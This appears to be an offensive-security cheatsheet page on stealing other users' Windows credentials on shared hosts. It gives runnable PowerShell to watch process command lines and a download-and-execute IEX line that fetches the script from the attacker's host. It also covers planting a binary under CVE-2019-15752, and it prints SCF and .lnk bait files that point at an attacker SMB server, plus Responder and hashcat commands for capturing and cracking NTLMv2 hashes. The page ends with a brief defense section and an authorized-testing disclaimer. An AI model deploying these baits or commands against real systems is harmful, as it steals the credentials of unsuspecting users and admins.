@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Capturing Credentials from Other Users · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>Capturing Credentials from Other Users</h1><p class="cx-lede">Stealing another user&#x27;s or admin&#x27;s credentials on a shared host when the local vectors are exhausted - sniffing cleartext traffic with an unrestricted Wireshark/Npcap, watching process command lines for passwords passed as arguments, abusing a vulnerable interactive service (CVE-2019-15752 Docker Desktop), and forced-authentication hash capture by planting an SCF or malicious .lnk on a file share and catching NTLMv2 with Responder to crack offline.</p><div class="cx-tags"><span class="cx-tag">MITRE T1557, T1040</span><span class="cx-tag">D3FEND D3-NTA, D3-ITF</span><span class="cx-tag">IMPACT CredentialTheft, PrivEsc</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When the host offers no direct escalation path, go after the <em>other users</em> on it. On a shared/multi-user box (RDS, jump host, Citrix backend, a busy workstation) you can often capture a more-privileged user's credentials passively or by baiting them - then reuse or crack them to escalate locally, in the domain, or to pivot.</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell"># Sniff cleartext creds (Npcap isn&#x27;t admin-restricted by default on many installs)
+# Wireshark on the host, or net-creds / tcpdump from an attack box on the segment
+
+# Watch process command lines for passwords passed as arguments
+while($true){ $a=gwmi Win32_Process|select CommandLine; sleep 1
+  $b=gwmi Win32_Process|select CommandLine; compare $a $b }
+
+# Forced-auth hash capture: plant a file that beacons to your SMB server, run Responder
+# SCF (pre-2019) or malicious .lnk (2019+) on a writable share → NTLMv2 → crack offline</code></pre></figure>
+<p>Success indicator: a captured cleartext credential (traffic/cmdline/clipboard) or an NTLMv2 hash you crack to plaintext - usable for a higher-privileged account.</p>
+<h2 id="when-this-applies">When this applies</h2>
+<p>This is a late-stage move: you've exhausted token, group, service, and credential-at-rest vectors, and the host has <em>other users</em> worth targeting - an admin who logs on to administer it, service accounts running scheduled jobs, or users browsing a share you can write to. The payoff is their credentials, not a direct kernel/service exploit.</p>
+<h2 id="traffic-capture">Traffic capture</h2>
+<p>If Wireshark/Npcap is installed, note that the option to restrict the capture driver to administrators is <strong>not enabled by default</strong> - so an unprivileged user can often sniff the wire and pick up cleartext protocol credentials (FTP, HTTP basic, SMTP, etc.) typed by another user on the same box.</p>
+<p>If the engagement puts you on an attack machine on the segment instead, run <code>tcpdump</code>/Wireshark for a while, or feed a pcap (or a live interface) to <a href="https://github.com/DanMcInerney/net-creds">net-creds</a> to auto-extract passwords and hashes. Let it run in the background - credentials surface opportunistically.</p>
+<h2 id="process-command-lines">Process command lines</h2>
+<p>Scheduled tasks, logon scripts, and admin one-liners frequently pass credentials as command-line arguments (<code>net use ... /user:dom\svc P@ss</code>, <code>sqlcmd -U -P</code>, installer silent switches). A standard user can watch for these by diffing the process list on a short interval:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">while($true){
+  $p1 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $p2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $p1 -DifferenceObject $p2    # prints newly-appeared command lines
+}</code></pre></figure>
+<p>Host it and run in memory (<code>IEX (iwr http://&lt;you&gt;/procmon.ps1)</code>), then wait for a task to fire. A hit like <code>net use T: \\sql02\backups /user:example\sqlsvc My4dm1nP@s5w0Rd</code> hands you a domain service account.</p>
+<div class="cx-aside cx-note">
+<p class="cx-aside-title">Note</p>
+<p>This only sees command lines you're <strong>permitted to read</strong>. <code>Win32_Process</code> returns a <code>null</code> <code>CommandLine</code> for another user's elevated or service process when you lack process-access rights to it, so as a standard user you mostly catch processes in your own context (and whatever ACLs happen to allow). It's opportunistic, not a guaranteed cross-user capture - the high-value hits are things <em>you</em> launched being re-run by a privileged scheduler, or loosely-ACL'd processes.</p>
+</div>
+<h2 id="vulnerable-interactive-services">Vulnerable interactive services</h2>
+<p>Some installed software escalates only when a user <em>interacts</em> with it - still worth planting during a longer assessment. The canonical case is <strong>CVE-2019-15752</strong> (Docker Desktop CE &lt; 2.1.0.1): on start and on <code>docker login</code>, it searches <code>C:\ProgramData\DockerDesktop\version-bin\</code> for helper binaries that don't ship with it, and that directory was writable by <code>BUILTIN\Users</code>. Drop a malicious <code>docker-credential-wincred.exe</code> there and it runs when Docker next starts or a user authenticates. The general pattern - <em>a writable directory a privileged or other-user process executes from</em> - recurs; plant and periodically check whether your payload fired.</p>
+<h2 id="forced-authentication-hash-capture">Forced-authentication hash capture</h2>
+<p>The highest-value technique: bait a user (or service account) into authenticating to an SMB server you control, and capture their <strong>NTLMv2</strong> challenge-response hash to crack offline. Plant the bait in a <strong>writable, heavily-used file share</strong> (or a user's workstation folder).</p>
+<div class="cx-aside cx-note">
+<p class="cx-aside-title">Note</p>
+<p>The hash you capture this way is <strong>NetNTLMv2</strong> - a challenge-response, <em>not</em> an NT hash, so you <strong>cannot pass-the-hash</strong> with it. You either crack it offline (<code>hashcat -m 5600</code>) or <strong>relay</strong> it to another host (<code>ntlmrelayx</code>). Plan for one of those before you start.</p>
+</div>
+<h3 id="scf-file-pre-server-2019">SCF file (pre-Server 2019)</h3>
+<p>A Shell Command File's <code>IconFile</code> can point at a UNC path; Windows Explorer resolves it - opening an SMB session to your server - the moment the user browses the folder. Name it with a leading <code>@</code> so it sorts to the top and renders immediately:</p>
+<figure class="cx-code"><figcaption>ini</figcaption><pre><code class="language-ini">[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop</code></pre></figure>
+<p>Save it as e.g. <code>@Inventory.scf</code> in the share, start <a href="https://github.com/lgandx/Responder">Responder</a> (or <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>), and wait:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sudo responder -I tun0 -v      # explicit-UNC bait needs no poisoning flags - just the SMB listener
+# (current Responder rejects the old -r/-f/-w combos; name-resolution poisoning isn&#x27;t needed here
+#  because the SCF/.lnk points straight at your IP - add -wF only if you also want WPAD poisoning)
+# [SMB] NTLMv2-SSP Username : SRV01\Administrator
+# [SMB] NTLMv2-SSP Hash     : Administrator::SRV01:...</code></pre></figure>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt       # crack offline</code></pre></figure>
+<p>Saving the SCF on an SMB share (not just your own box) is what lets you catch <em>other</em> users and service accounts - Explorer triggers it for whoever opens that folder.</p>
+<h3 id="malicious-lnk-server-2019">Malicious .lnk (Server 2019+)</h3>
+<p>SCF triggering was killed on Server 2019, but a shortcut (<code>.lnk</code>) with a UNC icon/target achieves the same forced auth. Generate one with <a href="https://github.com/dievus/lnkbomb">Lnkbomb</a> or a few lines of PowerShell:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">$o = New-Object -ComObject WScript.Shell
+$l = $o.CreateShortcut(&quot;$env:TEMP\legit.lnk&quot;)   # user-writable; a standard user can&#x27;t write C:\ root
+$l.TargetPath   = &quot;\\&lt;attackerIP&gt;\@pwn.png&quot;
+$l.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot;
+$l.Save()</code></pre></figure>
+<p>Drop it in the target share; browsing the folder triggers the auth to your Responder.</p>
+<h2 id="defense">Defense</h2>
+<ul>
+<li>Restrict the packet-capture driver to administrators (Npcap "restrict to admins" option); don't install Wireshark on multi-user servers.</li>
+<li>Never pass credentials as command-line arguments - they're visible to the process owner and to administrators via the process list (and land in logs/history). Other unprivileged users can't always read them, but don't rely on that - a SYSTEM/admin monitor or a loosely-ACL'd process exposes them.</li>
+<li>Kill the forced-auth surface, but match the control to the vector: disabling <strong>LLMNR, NBT-NS, and mDNS</strong> stops <em>poisoning-based</em> capture, yet the explicit-UNC bait above (literal IP) bypasses name resolution entirely - so also <strong>restrict outbound SMB/NTLM (TCP 445/139) to trusted destinations, including internally</strong>, since perimeter-only 445 filtering still leaves internal rogue servers reachable. Note <strong>SMB signing</strong> prevents NTLM <em>relay</em> to signing-required hosts, not challenge-response <em>capture</em> for offline cracking - only strong passwords defeat that. MFA does not protect NTLM.</li>
+<li>Lock write permissions on file shares and on any directory a privileged process executes from; audit third-party installers (the Docker case) for world-writable program dirs.</li>
+<li>Enforce long, random passwords so captured NetNTLMv2 hashes resist offline cracking.</li>
+</ul>
+<h2 id="related">Related</h2>
+<ul>
+<li><a href="../stored-credentials/index.html">Stored credentials</a> / <a href="../credential-hunting/index.html">Credential hunting</a> - credentials already on the host, before resorting to baiting users</li>
+<li><a href="../pillaging/index.html">Pillaging</a> - broader post-foothold data gathering (IM cookies, clipboard, backup repos)</li>
+<li><a href="../seimpersonate/index.html">SeImpersonate</a> - local forced-auth/relay primitives in the same family as Responder capture</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../legacy-systems/index.html">Previous: End-of-Life &amp; Legacy Systems</a><a class="cx-next" href="../pillaging/index.html">Next: Pillaging</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
